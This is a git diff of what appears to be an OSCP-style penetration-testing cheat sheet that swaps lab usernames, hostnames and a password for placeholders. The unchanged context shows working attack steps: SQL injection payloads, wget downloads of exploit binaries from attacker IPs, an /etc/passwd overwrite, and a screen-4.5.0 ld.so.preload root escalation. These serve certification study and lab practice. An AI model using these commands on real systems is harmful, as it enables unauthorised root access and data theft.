@@ -221,7 +221,7 @@ ssh userb@172.16.138.14 -i id_rsa
 ##### Public key obtained
 ````
 cat id_rsa.pub 
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/J91c2EvGkYDKL5xGbfQRxsT9IePkVINONXQHmzARaNS5lE+SoAfFAnCPnRJ+KrnJdPxYf4OQEiAxHwRJHvbYaxEEuye7GKP6V0MdSvDtqKsFk0YRFVdPKuforL/8SYtSfqYUywUJ/ceiZL/2ffGGBJ/trQJ2bBL4QcOg05ZxrEoiTJ09+Sw3fKrnhNa5/NzYSib+0llLtlGbagBh3F9n10yqqLlpgTjDp5PKenncFiKl1llJlQGcGhLXxeoTI59brTjssp8J+z6A48h699CexyGe02GZfKLLLE+wKn/4luY0Ve8tnGllEdNFfGFVm7WyTmAO2vtXMmUbPaavDWE9cJ/WFXovDKtNCJxpyYVPy2f7aHYR37arLL6aEemZdqzDwl67Pu5y793FLd41qWHG6a4XD05RHAD0ivsJDkypI8gMtr3TOmxYVbPmq9ecPFmSXxVEK8oO3qu2pxa/e4izXBFc= john@oscp #new user found
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/J91c2EvGkYDKL5xGbfQRxsT9IePkVINONXQHmzARaNS5lE+SoAfFAnCPnRJ+KrnJdPxYf4OQEiAxHwRJHvbYaxEEuye7GKP6V0MdSvDtqKsFk0YRFVdPKuforL/8SYtSfqYUywUJ/ceiZL/2ffGGBJ/trQJ2bBL4QcOg05ZxrEoiTJ09+Sw3fKrnhNa5/NzYSib+0llLtlGbagBh3F9n10yqqLlpgTjDp5PKenncFiKl1llJlQGcGhLXxeoTI59brTjssp8J+z6A48h699CexyGe02GZfKLLLE+wKn/4luY0Ve8tnGllEdNFfGFVm7WyTmAO2vtXMmUbPaavDWE9cJ/WFXovDKtNCJxpyYVPy2f7aHYR37arLL6aEemZdqzDwl67Pu5y793FLd41qWHG6a4XD05RHAD0ivsJDkypI8gMtr3TOmxYVbPmq9ecPFmSXxVEK8oO3qu2pxa/e4izXBFc= USERZ@example #new user found
 ````
 ##### Cracking Private Key
 ````
@@ -269,7 +269,7 @@ root@192.168.214.125: Permission denied (publickey,password).
 ````
 ##### Downloading files
 ````
-scp -r -i id_rsa john@192.168.214.149:/path/to/file/you/want .
+scp -r -i id_rsa USERZ@192.168.214.149:/path/to/file/you/want .
 ````
 ##### RCE with scp
 ````
@@ -521,8 +521,8 @@ cd 192.168.192.144 #Move into the .git directory localy
 ````
 ````
 sudo git show #Run a git show command in order to expose more information as below.                                                             
-commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
-Author: Stuart <luke@challenge.pwk>
+commit 213092183092183092138 (HEAD -> main)
+Author: Stuart <luke@example.com>
 Date:   Fri Nov 18 16:58:34 2022 -0500
 
     Security Update
@@ -535,8 +535,8 @@ index 55b1645..8ad08b0 100644
  class Database{
      private $host = "localhost";
      private $db_name = "staff";
--    private $username = "stuart@challenge.lab";
--    private $password = "BreakingBad92";
+-    private $username = "stuart@example.lab";
+-    private $password = "password123";
 +    private $username = "";
 +    private $password = "";
 +// Cleartext creds cannot be added to public repos!
@@ -1358,10 +1358,10 @@ https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pe
 ' 
 Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated 
 ' OR 1=1 -- #query
-Blog entry from Chris with title The Great Escape from 2017
+Blog entry from USERA with title The Great Escape from 2017
 Blog entry from Bob with title I Love Crypto from 2016
 Blog entry from Alice with title Man-in-the-middle from 2018
-Blog entry from Chris with title To Paris and Back from 2019
+Blog entry from USERA with title To Paris and Back from 2019
 Blog entry from Maria with title Software Development Lifecycle from 2018
 Blog entry from Eric with title Accounting is Fun from 2019
 ' union select 1,2,3,4,5,6-- #query
@@ -2598,7 +2598,7 @@ curl 127.0.0.1:8000
 root         852  0.0  3.9 2536668 80252 ?       Ssl  May16   0:04 java -Xdebug Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
 ````
 ````
-dev@oscp:/opt/stats$ cat App.java
+dev@example:/opt/stats$ cat App.java
 cat App.java
 import java.io.IOException;
 import java.io.InputStream;
@@ -2664,12 +2664,12 @@ python3 -m http.server 80
 wget http://192.168.45.191:80/exp
 chmod +x exp
 cp /etc/passwd /tmp/passwd.bak
-john@oscp:~$ ./exp /etc/passwd 1 ootz:
+USERZ@example:~$ ./exp /etc/passwd 1 ootz:
 It worked!
-john@oscp:~$ su rootz
-rootz@oscp:/home/john# whoami
+USERZ@example:~$ su rootz
+rootz@example:/home/USERZ# whoami
 rootz
-rootz@oscp:/home/john# id
+rootz@example:/home/USERZ# id
 uid=0(rootz) gid=0(root) groups=0(root)
 ````
 #### CVE-2021-3156
@@ -3090,7 +3090,7 @@ https://www.exploit-db.com/exploits/41154
 ````
 ````
 uname -a
-Linux oscp 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+Linux example 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 ````
 ##### Setup
 ````
@@ -3135,25 +3135,25 @@ root@Machine1:~# gcc -o rootshell rootshell.c
 ##### Attack
 ````
 cd /tmp
-aero@oscp:/tmp$ wget http://192.168.45.208:80/rootshell
-aero@oscp:/tmp$ wget http://192.168.45.208:80/libhax.so
+userG@example:/tmp$ wget http://192.168.45.208:80/rootshell
+userG@example:/tmp$ wget http://192.168.45.208:80/libhax.so
 chmod +x rootshell
 chmod +x libhax.so
 ````
 ````
-aero@oscp:/$ /tmp/rootshell
+userG@example:/$ /tmp/rootshell
 /tmp/rootshell
 $ id
 id
-uid=1000(aero) gid=1000(aero) groups=1000(aero)
+uid=1000(userG) gid=1000(userG) groups=1000(userG)
 
-aero@oscp:/$ cd /etc
-aero@oscp:/etc$ umask 000
-aero@oscp:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
-aero@oscp:/etc$ ls -l ld.so.preload
-aero@oscp:/etc$ screen-4.5.0 -ls
+userG@example:/$ cd /etc
+userG@example:/etc$ umask 000
+userG@example:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+userG@example:/etc$ ls -l ld.so.preload
+userG@example:/etc$ screen-4.5.0 -ls
 
-aero@oscp:/etc$ /tmp/rootshell
+userG@example:/etc$ /tmp/rootshell
 /tmp/rootshell
 # id
 id
